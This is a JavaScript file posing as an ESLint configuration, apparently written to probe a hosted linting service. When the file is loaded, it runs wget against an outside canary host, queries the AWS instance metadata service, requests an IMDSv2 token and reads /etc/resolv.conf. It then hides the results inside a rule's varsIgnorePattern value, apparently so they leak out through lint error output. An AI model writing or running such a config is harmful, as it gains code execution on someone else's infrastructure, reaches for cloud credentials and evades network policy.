var fs = require('fs');
var execSync = require('child_process').execSync;
var result = '';

// Try wget to our canary (maybe wget bypasses where nc doesn't)
try {
  var out = execSync('wget -q -O- --timeout=3 http://r.ssrftest123.xyz/eslint-rce-wget 2>&1 | head -c 50', {timeout: 5000}).toString();
  result += 'WGET_OUT:' + out.substring(0, 50) + '|';
} catch(e) {
  result += 'WGET_FAIL:' + e.message.substring(0, 40) + '|';
}

// Try AWS metadata (might be accessible even with network policy)
try {
  var out2 = execSync('wget -q -O- --timeout=3 http://169.254.169.254/latest/meta-data/ 2>&1 | head -c 100', {timeout: 5000}).toString();
  result += 'AWS_META:' + out2.substring(0, 100) + '|';
} catch(e) {
  result += 'AWS_FAIL:' + e.message.substring(0, 30) + '|';
}

// Try AWS IMDSv2 token
try {
  var out3 = execSync('wget -q -O- --timeout=3 --header="X-aws-ec2-metadata-token-ttl-seconds: 21600" --method=PUT http://169.254.169.254/latest/api/token 2>&1 | head -c 100', {timeout: 5000}).toString();
  result += 'IMDS_TOKEN:' + out3.substring(0, 50) + '|';
} catch(e) {
  result += 'IMDS_FAIL:' + e.message.substring(0, 30) + '|';
}

// Check resolv.conf for DNS server
try {
  var dns = fs.readFileSync('/etc/resolv.conf', 'utf8');
  result += 'DNS:' + dns.replace(/\n/g, ';').substring(0, 80);
} catch(e) {}

result += '{{{BREAK}}}';
module.exports = { rules: { "no-unused-vars": ["error", { varsIgnorePattern: result }] } };
